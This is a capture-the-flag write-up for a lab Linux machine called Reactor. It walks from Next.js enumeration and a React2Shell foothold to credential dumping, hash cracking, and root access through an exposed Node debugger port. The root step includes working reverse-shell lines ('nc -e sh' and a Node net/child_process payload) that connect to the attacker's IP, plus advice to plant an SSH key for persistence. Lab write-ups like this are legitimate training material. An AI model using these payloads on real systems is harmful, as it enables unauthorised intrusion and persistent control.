## Description
_Passwords, cracked hashes, and flags have been omitted from this writeup per platform guidelines._

```Description
Season - 11 Machine 
Reactor  - Easy   - Linux
```
## IP-Address
```bash
10.129.101.67
```
## Set MTU
```bash
$sudo ip link set dev tun0 mtu 1200
```
## Enumeration
- Rust-Scan
```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
3000/tcp open  ppp?    syn-ack ttl 63
| fingerprint-strings:
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, NCP, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServerCookie, X11Probe:
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest:
|     HTTP/1.1 404 Not Found
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     X-Powered-By: Next.js
|     Content-Type: text/html; charset=utf-8
|     Date: Fri, 29 May 2026 18:45:29 GMT
|     Connection: close
|   HTTPOptions, RTSPRequest:
|     HTTP/1.1 400 Bad Request
|     vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch
|     Allow: GET
|     Allow: HEAD
|     Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
|     Date: Fri, 29 May 2026 18:45:25 GMT
|_    Connection: close
```
- Port 3000
	- Initially Response `empty` using curl & browser 
```bash
$ curl -I http://reactor.htb:3000/
HTTP/1.1 200 OK 
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding 
x-nextjs-cache: HIT 
x-nextjs-prerender: 1 
x-nextjs-stale-time: 4294967294 
X-Powered-By: Next.js 
Cache-Control: s-maxage=31536000, 
ETag: "p02u6gnhufd8t" 
Content-Type: text/html; 
charset=utf-8 
Content-Length: 17175 
Date: Fri, 29 May 2026 19:55:43 GMT 
Connection: keep-alive 
Keep-Alive: timeout=5
```

----
#### BurpSuite
- On Burp Web-History got some chunks 
```Chunks 
/_next/static/chunks/4bd1b696-80bcaf75e1b4285e.js
/_next/static/chunks/517-d083b552e04dead1.js
/_next/static/chunks/webpack-db0a529a99835594.js
```
- Leads to nothing, Provide header info 
```bash
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding 
X-Powered-By: Next.js 
ETag: "p02u6gnhufd8t" 
and Title - Reactor Watch Monitoring system 
```
- `Next.js` , `Next-Router`, technologies
- `Robots.txt`
```Request
GET /robots.txt HTTP/1.1
Host: reactor.htb:3000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Sec-GPC: 1
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate
Connection: close
```
- Response
```bash
HTTP/1.1 404 Not Found
Cache-Control: private, no-cache, no-store, max-age=0, must-revalidate
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
X-Powered-By: Next.js
Content-Type: text/html; charset=utf-8
Date: Fri, 29 May 2026 21:12:04 GMT
Connection: close
Content-Length: 6719

- `ReactorWatch | Core Monitoring System` | `<script>self.__next_f.push`
- Looked for `React-Watch` package in `npm` as `Next.js` 
- Online Found - `React2Shell` #CVE-2025-55182 
- Crafted Personalized `React2Shell_scanner` and run `Bash` command
- Claimed `Reversed-Shell`
```


----
#### Reverse-shell
```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.80] from (UNKNOWN) [10.129.101.78] 54442
$python3 -c 'import pty; pty.spawn("/bin/bash")'

node@reactor:/opt/reactor-app$ ls -la
ls -la
total 76
drwxr-xr-x  5 node node  4096 Dec 28 21:05 .
drwxr-xr-x  4 root root  4096 Apr 27 11:26 ..
drwxr-xr-x  2 node node  4096 Dec 28 20:47 app
-rw-r--r--  1 node node   276 Dec 28 21:05 .env
drwxr-xr-x  7 node node  4096 Dec 28 20:47 .next
-rw-r--r--  1 node node   172 Dec 28 20:47 next.config.js
drwxr-xr-x 30 node node  4096 Dec 28 20:47 node_modules
-rw-r--r--  1 node node   269 Dec 28 20:47 package.json
-rw-r--r--  1 node node 29329 Dec 28 20:47 package-lock.json
-rw-r-----  1 node node 12288 Dec 28 21:03 reactor.db
node@reactor:/opt/reactor-app$ cat next.config.js

cat next.config.js
/** @type {import('next').NextConfig} */
const nextConfig = {
  experimental: {
    serverActions: {
      bodySizeLimit: '2mb',
    },
  },
}

module.exports = nextConfig

node@reactor:/opt/reactor-app$ strings reactor.db
strings reactor.db
SQLite format 3
Mtablesensor_logssensor_logs
CREATE TABLE sensor_logs (
    id INTEGER PRIMARY KEY,
    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
    sensor_id TEXT,
    reading REAL,
    status TEXT
9tableusersusers
CREATE TABLE users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password_hash TEXT NOT NULL,
    role TEXT NOT NULL,
    email TEXT
5engineer[hash omitted]operatorengineer@reactor.htbI
M''/admin[hash omitted]administratoradmin@reactor.htb
2025-12-28 14:32:01COOLANT_FLOW@2ffffffCAUTION3
2025-12-28 14:32:01PRESSURE_01@cffffffNOMINAL4
2025-12-28 14:32:01CORE_TEMP_01@tH
NOMINAL

node@reactor:/opt/reactor-app$ cat .env
cat .env
# ReactorWatch Configuration
# Database connection for sensor data

DB_PATH=/opt/reactor-app/reactor.db
DB_TYPE=sqlite3

# API Keys
SENSOR_API_KEY=[api key omitted]
ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook

# Node environment
NODE_ENV=production
```
----
#### SQLITE 
- Database - `reactor.db`
```
node@reactor:/opt/reactor-app$ sqlite3 reactor.db
sqlite> .tables
.tables
sensor_logs  users
sqlite> SELECT * FROM users;
SELECT * FROM users;
1|admin|[hash omitted]|administrator|admin@reactor.htb
2|engineer|[hash omitted]|operator|engineer@reactor.htb
```
----
#### Hashes
```bash
$ cat > hashes.txt << EOF
[hash omitted]
[hash omitted]
EOF

hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

[hash omitted]:[password omitted]
```
----
#### Credentials
```Creds
username - Engineer
Password - [password omitted]
Method - SSH 
```
----
#### Login
```bash
$ ssh engineer@reactor.htb
Password : [password omitted]
engineer@reactor:~$ ls -la
total 36
drwxr-x--- 4 engineer engineer 4096 May 20 10:12 .
drwxr-xr-x 4 root     root     4096 May 18 11:40 ..
-rw------- 1 engineer engineer    0 May 20 10:12 .bash_history
-rw-r--r-- 1 engineer engineer  220 Mar 31  2024 .bash_logout
-rw-r--r-- 1 engineer engineer 3771 Mar 31  2024 .bashrc
drwx------ 2 engineer engineer 4096 May 18 11:40 .cache
-rw------- 1 engineer engineer   20 Dec 28 20:48 .lesshst
-rw-r--r-- 1 engineer engineer  807 Mar 31  2024 .profile
drwx------ 2 engineer engineer 4096 May 18 11:40 .ssh
-rw-r--r-- 1 engineer engineer    0 Dec 28 20:30 .sudo_as_admin_successful
-rw-r----- 1 root     engineer   33 May 29 23:16 user.txt
engineer@reactor:~$ cat user.txt
[flag omitted]
```
----
#### User's Permission
```bash
engineer@reactor:~$ id
uid=1000(engineer) gid=1000(engineer) groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)
engineer@reactor:~$ groups
engineer adm cdrom dip plugdev lxd

$ sudo -l
[sudo] password for engineer:
Sorry, user engineer may not run sudo on reactor.

engineer@reactor:~$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/chfn
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/fusermount3
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/su
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/polkit-1/polkit-agent-helper-1
```

-----
#### LSE
```bash
./lse.sh
---
If you know the current user password, write it here to check sudo privileges: [password omitted]
---

 LSE Version: 4.14nw

        User: engineer
     User ID: 1000
    Password: ******
        Home: /home/engineer
        Path: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
       umask: 0002

    Hostname: reactor
       Linux: 6.8.0-117-generic
Distribution: Ubuntu 24.04.4 LTS
Architecture: x86_64

======( network )=====
[*] net000 Services listening only on localhost............................ yes!
[!] net010 Can we sniff traffic with tcpdump?.............................. nope
[i] net500 NIC and IP information.......................................... skip
[i] net510 Routing table................................................... skip
[i] net520 ARP table....................................................... skip
[i] net530 Nameservers..................................................... skip
[i] net540 Systemd Nameservers............................................. skip
[i] net550 Listening TCP................................................... skip
[i] net560 Listening UDP................................................... skip
======( services )=====
[!] srv000 Can we write in service files?.................................. nope
[!] srv010 Can we write in binaries executed by services?.................. nope
[*] srv020 Files in /etc/init.d/ not belonging to root..................... nope
[*] srv030 Files in /etc/rc.d/init.d not belonging to root................. nope
[*] srv040 Upstart files not belonging to root............................. nope
[*] srv050 Files in /usr/local/etc/rc.d not belonging to root.............. nope
[i] srv400 Contents of /etc/inetd.conf..................................... skip
[i] srv410 Contents of /etc/xinetd.conf.................................... skip
[i] srv420 List /etc/xinetd.d if used...................................... skip
[i] srv430 List /etc/init.d/ permissions................................... skip
[i] srv440 List /etc/rc.d/init.d permissions............................... skip
[i] srv450 List /usr/local/etc/rc.d permissions............................ skip
[i] srv460 List /etc/init/ permissions..................................... skip
[!] srv500 Can we write in systemd service files?.......................... nope
[!] srv510 Can we write in binaries executed by systemd services?.......... nope
[*] srv520 Systemd files not belonging to root............................. nope
[i] srv900 Systemd config files permissions................................ skip
======( software )=====
[!] sof000 Can we connect to MySQL with root/root credentials?............. nope
[!] sof010 Can we connect to MySQL as root without password?............... nope
[!] sof015 Are there credentials in mysql_history file?.................... nope
[!] sof020 Can we connect to PostgreSQL template0 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template1 as postgres and no pass?. nope
[!] sof020 Can we connect to PostgreSQL template0 as psql and no pass?..... nope
[!] sof020 Can we connect to PostgreSQL template1 as psql and no pass?..... nope
[*] sof030 Installed apache modules........................................ nope
[!] sof040 Found any .htpasswd files?...................................... nope
[!] sof050 Are there private keys in ssh-agent?............................ nope
[!] sof060 Are there gpg keys cached in gpg-agent?......................... nope
[!] sof070 Can we write to a ssh-agent socket?............................. nope
[!] sof080 Can we write to a gpg-agent socket?............................. yes!
---
/run/user/1000/gnupg/S.gpg-agent.ssh
/run/user/1000/gnupg/S.gpg-agent
/run/user/1000/gnupg/S.gpg-agent.extra
/run/user/1000/gnupg/S.gpg-agent.browser
---
[!] sof090 Found any keepass database files?............................... nope
[!] sof100 Found any 'pass' store directories?............................. nope
[!] sof110 Are there any tmux sessions available?.......................... nope
[*] sof120 Are there any tmux sessions from other users?................... nope
[!] sof130 Can we write to tmux session sockets from other users?.......... nope
[!] sof140 Are any screen sessions available?.............................. nope
[*] sof150 Are there any screen sessions from other users?................. nope
[!] sof160 Can we write to screen session sockets from other users?........ nope
[*] sof170 Can we access MongoDB databases without credentials?............ nope
[!] sof180 Can we access any Kerberos credentials?......................... nope
[i] sof500 Sudo version.................................................... skip
[i] sof510 MySQL version................................................... skip
[i] sof520 Postgres version................................................ skip
[i] sof530 Apache version.................................................. skip
[i] sof540 Tmux version.................................................... skip
[i] sof550 Screen version.................................................. skip
=====( containers )=====
[*] ctn000 Are we in a docker container?................................... nope
[*] ctn010 Is docker available?............................................ nope
[!] ctn020 Is the user a member of the 'docker' group?..................... nope
[*] ctn200 Are we in a lxc container?...................................... nope
[!] ctn210 Is the user a member of any lxc/lxd group?...................... yes!
---
engineer adm cdrom dip plugdev lxd
---
=====( processes )=====
[i] pro000 Waiting for the process monitor to finish....................... yes!
[i] pro001 Retrieving process binaries..................................... yes!
[i] pro002 Retrieving process users........................................ yes!
[!] pro010 Can we write in any process binary?............................. nope
[*] pro020 Processes running with root permissions......................... yes!
[*] pro030 Processes running by non-root users with shell.................. yes!
[i] pro500 Running processes............................................... skip
[i] pro510 Running process binaries and permissions........................ skip
=====( CVEs )=====
[!] cve-2019-5736 Escalate in some types of docker containers.............. nope
[!] cve-2021-3156 Sudo Baron Samedit vulnerability......................... nope
[!] cve-2021-3560 Checking for policykit vulnerability..................... nope
[!] cve-2021-4034 Checking for PwnKit vulnerability........................ nope
[!] cve-2022-0847 Dirty Pipe vulnerability................................. nope
[!] cve-2022-25636 Netfilter linux kernel vulnerability.................... nope
[!] cve-2023-22809 Sudoedit bypass in Sudo <= 1.9.12p1..................... nope

====( FINISHED )======
```
- System Network is Running something Locally
```bash
$ ss -lntp
State        Recv-Q       Send-Q             Local Address:Port               Peer Address:Port       Process
LISTEN       0            511                    127.0.0.1:9229                    0.0.0.0:*
LISTEN       0            4096                     0.0.0.0:22                      0.0.0.0:*
LISTEN       0            4096               127.0.0.53%lo:53                      0.0.0.0:*
LISTEN       0            4096                  127.0.0.54:53                      0.0.0.0:*
LISTEN       0            4096                        [::]:22                         [::]:*
LISTEN       98           511                            *:3000                          *:*
```
----
#### Local Service 
```bash
engineer@reactor:/tmp$ systemctl --type=service --state=running
  UNIT                      LOAD   ACTIVE SUB     DESCRIPTION
  auditd.service            loaded active running Security Auditing Service
  cron.service              loaded active running Regular background program processing daemon
  dbus.service              loaded active running D-Bus System Message Bus
  getty@tty1.service        loaded active running Getty on tty1
  ModemManager.service      loaded active running Modem Manager
  open-vm-tools.service     loaded active running Service for virtual machines hosted on VMware
  polkit.service            loaded active running Authorization Manager
  reactor-app.service       loaded active running ReactorWatch Monitoring Dashboard
  rsyslog.service           loaded active running System Logging Service
  ssh.service               loaded active running OpenBSD Secure Shell server
  systemd-journald.service  loaded active running Journal Service
  systemd-logind.service    loaded active running User Login Management
  systemd-resolved.service  loaded active running Network Name Resolution
  systemd-timesyncd.service loaded active running Network Time Synchronization
  systemd-udevd.service     loaded active running Rule-based Manager for Device Events and Files
  udisks2.service           loaded active running Disk Manager
  upower.service            loaded active running Daemon for power management
  uptime-monitor.service    loaded active running Internal uptime/latency monitor for the SSR app
  user@1000.service         loaded active running User Manager for UID 1000
  vgauth.service            loaded active running Authentication service for virtual machines hosted on VMware
```
- Suspicious Services
```bash
	Services                Descrption
 uptime-monitor.service     running Internal uptime/latency monitor                                for the SSR app
 reactor-app.service        ReactorWatch Monitoring Dashboard ##Web-APP
```
----
#### Service Enumeration
```bash
$ systemctl cat uptime-monitor.service
# /etc/systemd/system/uptime-monitor.service
[Unit]                                                                                                             >
Description=Internal uptime/latency monitor for the SSR app
After=network.target                                                                                               >
[Service]                                                                                                          >
Type=simple
User=root
ExecStart=/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
Restart=on-failure                                                                                                 >
RestartSec=3
StandardOutput=journal                                                                                             >
StandardError=journal                                                                                             >

[Install]                                                                                                          >
WantedBy=multi-user.target
```
- File ://opt/uptime-monitor/worker.js
```bash
 cat /opt/uptime-monitor/worker.js
const http = require('http');
const fs = require('fs');

const TARGET_URL = 'http://127.0.0.1:3000/';
const CSV_FILE = '/var/log/uptime-monitor.csv';
const INTERVAL_MS = 30_000;
const TIMEOUT_MS = 10_000;

function csvEscape(value) {
    const s = String(value ?? '');
    return /[",\n]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

function record({ status, latency, size, error }) {
    const row = [
        new Date().toISOString(),
        status ?? '',
        latency ?? '',
        size ?? '',
        error ?? '',
    ]
        .map(csvEscape)
        .join(',') + '\n';

    fs.appendFileSync(CSV_FILE, row);
}

function probe() {
    const start = process.hrtime.bigint();
    let bytes = 0;

    const req = http.get(TARGET_URL, { timeout: TIMEOUT_MS }, (res) => {
        res.on('data', (chunk) => {
            bytes += chunk.length;
        });

        res.on('end', () => {
            const latencyMs = Number(
                (process.hrtime.bigint() - start) / 1_000_000n
            );

            record({
                status: res.statusCode,
                latency: latencyMs,
                size: bytes,
            });
        });
    });

    req.on('error', (error) => {
        const latencyMs = Number(
            (process.hrtime.bigint() - start) / 1_000_000n
        );

        record({
            latency: latencyMs,
            error: error.code || error.message,
        });
    });

    req.on('timeout', () => {
        req.destroy();

        record({
            latency: TIMEOUT_MS,
            error: 'TIMEOUT',
        });
    });
}

setInterval(probe, INTERVAL_MS);
probe();

console.log('uptime-monitor up, pid=' + process.pid);
```
- Key Notes
```Notes
- Service
- User=root  
- ExecStart=/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js   -- Able to Run Command as Root
- File - Not writable Owned By Root
- Service Working 
  - const TARGET_URL = 'http://127.0.0.1:3000/';  
  - const CSV_FILE = '/var/log/uptime-monitor.csv';
```
- Curl 
```bash
 curl http://127.0.0.1:9229/json/list
[ {
  "description": "node.js instance",
  "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=127.0.0.1:9229/4377a135-d2fb-4eac-9912-8e6423628c3d",
  "devtoolsFrontendUrlCompat": "devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:9229/4377a135-d2fb-4eac-9912-8e6423628c3d",
  "faviconUrl": "https://nodejs.org/static/images/favicons/favicon.ico",
  "id": "4377a135-d2fb-4eac-9912-8e6423628c3d",
  "title": "/opt/uptime-monitor/worker.js",
  "type": "node",
  "url": "file:///opt/uptime-monitor/worker.js",
  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/4377a135-d2fb-4eac-9912-8e6423628c3d"
} ]
```
- Developer Tools Enabled - `WebSocketDebuggerUrl` which actually allow debugging in real life and LFI as Well Code Execution
-----
#### Privilege Escalation
- SSH Tunneling
```bash
$ ssh -L 9229:127.0.0.1:9229 engineer@reactor.htb
engineer@reactor.htb's password:
 ____  _____    _    ____ _____ ___  ____
|  _ \| ____|  / \  / ___|_   _/ _ \|  _ \
| |_) |  _|   / _ \| |     | || | | | |_) |
|  _ <| |___ / ___ \ |___  | || |_| |  _ <
|_| \_\_____/_/   \_\____| |_| \___/|_| \_\

    ReactorWatch Core Monitoring System
    Nuclear Dynamics Corp. - Site 7

    AUTHORIZED PERSONNEL ONLY
Last login: Sat May 30 00:24:20 2026 from 10.10.14.80
engineer@reactor:~$
```
- Browser > Navigate to `127.0.0.1:9229`
- Right Click > Inspect > Console 
```node
 allow pasting
require('child_process').execSync('ls -la').toString();
'total 85\ndrwxr-xr-x  23 root root  4096 May 20 10:07 .\ndrwxr-xr-x  23 root root  4096 May 20 10:07 ..\nlrwxrwxrwx   1 root root     7 Apr 22  2024 bin -> usr/bin\ndrwxr-xr-x   2 root root  4096 May 18 11:40 bin.usr-is-merged\ndrwxr-xr-x   4 root root  1024 May 20 09:36 boot\ndr-xr-xr-x   2 root root  4096 Aug  5  2025 cdrom\ndrwxr-xr-x  20 root root  4040 May 29 23:15 dev\ndrwxr-xr-x 108 root root  4096 May 18 12:54 etc\ndrwxr-xr-x   4 root root  4096 May 18 11:40 home\nlrwxrwxrwx   1 root root     7 Apr 22  2024 lib -> usr/lib\nlrwxrwxrwx   1 root root     9 Apr 22  2024 lib64 -> usr/lib64\ndrwxr-xr-x   2 root root  4096 Feb 26  2024 lib.usr-is-merged\ndrwx------   2 root root 16384 Dec 28 20:26 lost+found\ndrwxr-xr-x   2 root root  4096 Aug  5  2025 media\ndrwxr-xr-x   2 root root  4096 May 18 11:40 mnt\ndrwxr-xr-x   4 root root  4096 Apr 27 11:26 opt\ndr-xr-xr-x 292 root root     0 May 29 23:15 proc\ndrwx------   7 root root  4096 May 29 23:16 root\ndrwxr-xr-x  26 root root   820 May 29 23:57 run\nlrwxrwxrwx   1 root root     8 Apr 22  2024 sbin -> usr/sbin\ndrwxr-xr-x   2 root root  4096 May 18 11:40 sbin.usr-is-merged\ndrwxr-xr-x   2 root root  4096 May 18 11:40 snap\ndrwxr-xr-x   2 root root  4096 Aug  5  2025 srv\ndr-xr-xr-x  13 root root     0 May 29 23:15 sys\ndrwxrwxrwt  16 root root  4096 May 30 00:00 tmp\ndrwxr-xr-x  12 root root  4096 Aug  5  2025 usr\ndrwxr-xr-x  13 root root  4096 May 18 11:40 var\n'
require('child_process').exec('nc -e sh 10.10.14.80 4444')
ChildProcess {_events: {…}, _eventsCount: 2, _maxListeners: undefined, _closesNeeded: 3, _closesGot: 0, …}connected: falseexitCode: 1killed: falsepid: 6771signalCode: nullspawnargs: (3) ['/bin/sh', '-c', 'nc -e sh 10.10.14.80 4444']spawnfile: "/bin/sh"stderr: Socket {connecting: false, _hadError: false, _parent: null, _host: null, _closeAfterHandlingError: false, …}stdin: Socket {connecting: false, _hadError: false, _parent: null, _host: null, _closeAfterHandlingError: false, …}stdio: (3) [Socket, Socket, Socket]stdout: Socket {connecting: false, _hadError: false, _parent: null, _host: null, _closeAfterHandlingError: false, …}_closesGot: 3_closesNeeded: 3_events: {close: ƒ, error: ƒ}_eventsCount: 2_handle: null_maxListeners: undefinedSymbol(kCapture): falseSymbol(shapeMode): false[[Prototype]]: EventEmitter
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(4444, "10.10.14.80", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
/a/
```
- This Payload Converted into Reverse-shell
```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.80] from (UNKNOWN) [10.129.101.78] 43284
python3 -m 'import pty; pty.spawn("spawn/bin/bash")'

whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
pwd
/
cd /root
pwd
/root
ls -la
total 44
drwx------  7 root root 4096 May 29 23:16 .
drwxr-xr-x 23 root root 4096 May 20 10:07 ..
-rw-------  1 root root    0 May 20 10:12 .bash_history
-rw-r--r--  1 root root 3106 Apr 22  2024 .bashrc
drwx------  2 root root 4096 May 20 09:10 .cache
drwxr-xr-x  3 root root 4096 Dec 28 20:47 .config
-rw-------  1 root root   20 May 18 13:10 .lesshst
drwxr-xr-x  3 root root 4096 Dec 28 20:54 .local
drwxr-xr-x  4 root root 4096 Dec 28 20:37 .npm
-rw-r--r--  1 root root  161 Apr 22  2024 .profile
-rw-r-----  1 root root   33 May 29 23:16 root.txt
drwx------  2 root root 4096 Dec 28 20:30 .ssh
cat root.txt
[flag omitted]
```
- Got the Root Assess
- To fully obtained control add you `own` `SSH` Key inside the `/root/.ssh/authorized_keys`
- Login using `ssh -i <ssh_key>`
## END